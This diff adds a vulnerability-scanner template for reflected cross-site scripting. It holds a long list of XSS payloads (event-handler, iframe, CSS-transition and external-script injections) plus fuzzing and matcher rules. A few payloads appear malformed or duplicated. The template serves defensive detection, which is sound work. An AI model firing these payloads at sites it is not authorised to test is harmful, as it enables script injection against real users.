@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<style>:target {transform: rotate(180deg);}</style><script id=x tabindex=1 onfocusout=alert(1)></script>"
+        - "<sup id=x tabindex=1 onbeforeactivate=alert(1)></sup><input autofocus>"
+        - "<div id=\"payloadbox\"> <a href=\"/xss-payload-list/README.md\"> / xss - payload - list </a>  </div><script>document.getElementById('payloadbox').innerHTML = '1';</script>"
+        - "<script>\\x08alert(1) \\x0A</script><input autofocus>"
+        - "<style>:target {background:red;}</style><input id=x style=\"transition:transform 2s\" onanimationcancel=alert(1)>"
+        - "<form id=x tabindex=1 onbeforeactivate=alert(1)></form><input type=button id=y value=z onbeforedeactivate=alert(2)>"
+        - "<pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>"
+        - "<em id=x tabindex=1 onbeforeactivate=alert(1)></em>"
+        - "<tt style=\"cursor:url(http://ha.ckers.org/xss.jpg), move\">XSS</tt>"
+        - "<font draggable=\"true\" ondragend=\"alert(1)\">test</font><input id=x tabindex=1 ondeactivate=alert(1) autofocus>"
+        - "<sub style=\"position:absolute;\" id=x tabindex=1 onbeforeactivate=alert(1)></sub><input id=y autofocus>"
+        - "<sup onblur=alert(1) tabindex=1 id=x></sup><input autofocus>"
+        - "<frameset onload=javascript:alert(1)></frameset>"
+        - "<menuitem id=x tabindex=1 onbeforefocusout=alert(1)></menuitem><input id=y autofocus>"
+        - "<script><img src=x onerror=\"javascript:alert(1)\"></script>"
+        - "<script id=x tabindex=1 onclick=alert(1)></script>"
+        - "<script src='data:text/javascript;base64,PHRpdGxlPk5vIGV4cGVuZWQgd2l0aCAxNSBzdGFydDw8L3RpdGxlPg=='></script>"
+        - "<style>:target {transform: rotate(180deg);}</style><input id=x style=\"position:absolute\" onmouseup=alert(1)>"
+        - "<script src=\"http://xss[.]jsfiddle[.]com/\"></script>"
+        - "<video id=x tabindex=1 onfocusout=alert(1)></video><input autofocus>"
+        - "<script src=\"https://payloadbox.com/xss-payload-list/README.md\" defer></script>"
+        - "<datalist draggable=\"true\" ondragenter=\"alert(1)\">test</datalist>"
+        - "<style>:target {transform: rotate(180deg);}</style><summary id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></summary>"
+        - "<style>:target {transform: rotate(180deg);}</style><h2 id=x style=\"transition:transform 3s\" ontransitionrun=alert(1)></h2>"
+        - "<script>alert(\"XSS\")</script>"
+        - "<frameset onload=javascript:alert(1)></frameset>"
+        - "<style>:target {transform: rotate(180deg);}</style><frame id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></frame>"
+        - "<sup style=\"transition-duration:1s\" ontransitionrun=alert(1)></sup>"
+        - "<video draggable=\"true\" ondragenter=\"alert(1)\">test</video>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>"
+        - "<style>:target {transform: rotate(180deg);}</style><menuitem id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></menuitem>"
+        - "<iframe onload=alert(1)></iframe>"
+        - "<div id=x tabindex=1 onbeforeactivate=alert(1)></div>"
+        - "<html lang=\"en\" id=\"payload1\"> <head><title>xss Payload 1</title></head> <body onmouseout=\"alert(1)\">test</body> </html>"
+        - "<pre style=\"position:absolute;left:-9999px\">alert(&quot;XSS&quot;)</pre>"
+        - "<script>alert(1)</script>\\n<script>alert(String.fromCharCode(88,83,83))</script>\\n<script>javascript:alert('XSS');</script>\\n<noframes oncut=\"alert(1)\" contenteditable>test</noframes>\\n<meta draggable=\"true\" ondragleave=\"alert(1)\">test</meta>\\n<address id=x style=\"position:absolute;\" onmousemove=\"alert(1)\">test</address><nav id=y style=\"left:10000px;right:0\" onmouseenter=alert(1)></nav>"
+        - "<style>:target {transform: rotate(180deg);}</style><input id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)>"
+        - "<dl draggable=\"true\" ondragleave=\"alert(1)\">test</dl>"
+        - "<form id=1 onfocusout=alert(1) tabindex=1></form><input autofocus>"
+        - "<nobr onmousemove=\"alert(1)\">test</nobr>"
+        - "<iframe src=\"javascript:alert(1)\" onbeforeunload=\"alert(2)\"></iframe>"
+        - "<video style=\"display:none\" id=x tabindex=1 onfocusin=alert(1)></video><input autofocus>"
+        - "<template draggable=\"true\" ondragend=\"alert(1)\">test</template>"
+        - "<xmp onmouseover=\"alert(1)\">test</xmp>"
+        - "<style>@keyframes slidein {}</style><template style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></template>"
+        - "<output id=\"payloadbox\" onpaste=\"alert(1)\">test</output><input id=x tabindex=1 autofocus>"
+        - "<plaintext onbeforepaste=\"alert(1)\" contenteditable>test</plaintext>"
+        - "<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input autofocus>"
+        - "<;scr1pt>;alert(1)<;/scr1pt>;"
+        - "<video id=x tabindex=1 onfocusin=alert(1)></video><input autofocus>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
